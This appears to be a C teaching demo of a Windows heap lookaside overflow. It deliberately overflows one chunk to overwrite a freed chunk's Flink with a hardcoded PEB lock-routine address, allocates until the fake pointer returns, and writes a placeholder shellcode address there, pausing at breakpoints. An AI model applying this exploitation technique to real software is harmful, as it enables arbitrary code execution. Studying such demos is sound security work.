/*
Overwriting a chunk on the lookaside example
*/
#include <stdio.h>
#include <windows.h>

char g_shellcode[] = "\x90\x90\x90\x90";

int main(int argc, char *argv[])
{
	LPVOID a, b, c;
	HANDLE hHeap;
	char buf[10];

	printf("----------------------------\n");
	printf("Overwrite a chunk on the lookaside\n");
	printf("Heap demonstration\n");
	printf("----------------------------\n");

	// create the heap
	hHeap = HeapCreate(0x00040000, 0, 0);
	printf("\n(+) Creating a heap at: 0x00%xh\n", hHeap);
	printf("(+) Allocating chunk A\n");

	// allocate the first chunk of size N (<0x3F8 bytes)
	a = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);
	printf("(+) Allocating chunk B\n");

	// allocate the second chunk of size N (<0x3F8 bytes)
	b = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);

	printf("(+) Chunk A=0x00%x\n(+) Chunk B=0x00%x\n", a, b);
	printf("(+) Freeing chunk B to the lookaside\n");

	// Freeing of chunk B: the chunk gets referenced to the lookaside list
	HeapFree(hHeap, 0, b);

	// set software bp
	__asm
	{
		int 3
	}

	printf("(+) Now overflow chunk A:\n");

	// The overflow occurs in chunk A: we can manipulate chunk B's Flink
	// PEB lock routine for testing purposes
	// 16 bytes for size, 8 bytes for header and 4 bytes for the flink

	sprintf((char *)a,"XXXXXXXXXXXXXXXXAAAABBBB\x20\xf0\xfd\x7f");

	// strcpy(a,"XXXXXXXXXXXXXXXXAAAABBBBDDDD");

	//gets(a);

	// set software bp
	__asm
	{
		int 3
	}

	printf("(+) Allocating chunk B\n");

	// A chunk of block size N is allocated (C). Our fake pointer is returned
	// from the lookaside list.
	b = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x10);
	printf("(+) Allocating chunk C\n");

	// set software bp
	__asm
	{
		int 3
	}

	// A second chunk of size N is allocated: our fake pointer is returned
	c = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x0);

	printf("(+) Chunk A=0x00%x\n(+)Chunk B=0x00%x\n(+) Chunk C=0x00%x\n", a, b, c);

	// A copy operation from a controlled input to this buffer occurs: these
	// bytes are written to our chosen location
	// insert shellcode here
	sprintf((char *)c, "%x", &g_shellcode);
	//gets(c);

	// set software bp
	__asm
	{
		int 3
	}

	exit(0);
}